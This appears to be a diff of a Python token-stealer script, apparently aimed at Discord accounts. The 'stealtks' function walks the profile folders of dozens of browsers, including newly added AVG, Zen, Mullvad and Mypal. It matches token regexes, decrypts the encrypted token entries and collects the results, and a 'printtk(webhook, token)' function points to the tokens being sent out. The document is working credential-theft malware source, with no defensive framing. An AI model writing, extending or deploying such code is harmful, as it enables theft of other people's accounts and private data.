@@ -300,9 +300,11 @@ def printtk(webhook, token):
 #       3 = firefox
       
 def stealtks():
-    
     tokens = set()
     
+    regex1 = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
+    regex2 = r"dQw4w9WgXcQ:[^\"]*"
+
     roaming = os.getenv('appdata')
     local = os.getenv('localappdata')
     
@@ -315,11 +317,15 @@ def stealtks():
     '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
     '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
     '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
+    '0AVG': os.path.join(local, 'AVG', 'Browser', 'User Data'),
+    '0Supermium': os.path.join(local, 'Supermium', 'User Data'),
+    '0Escosia': os.path.join(local, 'EscosiaBrowser', 'User Data'), #FUCK THE POLAR BEARS
     '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
     '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
     '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
+    '0WaveBrowser': os.path.join(local, 'WaveBrowser', 'User Data'),
     '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
     '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
     '0Iridium': os.path.join(local, "Iridium", "User Data"),
@@ -344,8 +350,10 @@ def stealtks():
     '3FireFox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
     '3WaterFox': os.path.join(roaming, 'Waterfox', 'Profiles'),
     '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
-}
-    #this is doing way too much for a token stealer
+    '3Zen': os.path.join(roaming, 'zen', 'Profiles'),
+    '3Mullvad': os.path.join(roaming, 'Mullvad', 'MullvadBrowser', 'Profiles'),
+    '4Mypal': os.path.join(roaming, 'Mypal68', 'Profiles'),
+    }
     for browser, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -386,7 +394,7 @@ def stealtks():
                             for m in match:
                                 enc = m.split('dQw4w9WgXcQ:')[1]
                                 enc = base64.b64decode(enc)
-                                t = decryptv(enc, key)
+                                t = decrypt_password(enc, key)
                                 if not t is None:
                                    tokens.add(t)
                 except:
@@ -425,10 +433,25 @@ def stealtks():
                                 tokens.add(m)
                     except:
                         pass
-                
-    print(tokens)
-    print(str(len(tokens)), 'tokens logged')
+
+        elif browser.startswith('4'):
+            prof = os.listdir(path)
+            for profpth in prof:
+                tkdb = os.path.join(path, profpth, 'webappstore.sqlite')
+                if not os.path.exists(tkdb):
+                    continue
+                try:
+                    with open(tkdb, errors="ignore", encoding="utf-8") as f:
+                        gnw = f.read()
+                        match = re.findall(regex1, gnw)
+                        for m in match:
+                            tokens.add(m)
+                except:
+                    pass
+
+
     return tokens
+
 
 def errormsg():
     if errtype.lower() == 'error':
@@ -457,5 +480,6 @@ def main():
         
 
 main()
+
 
 
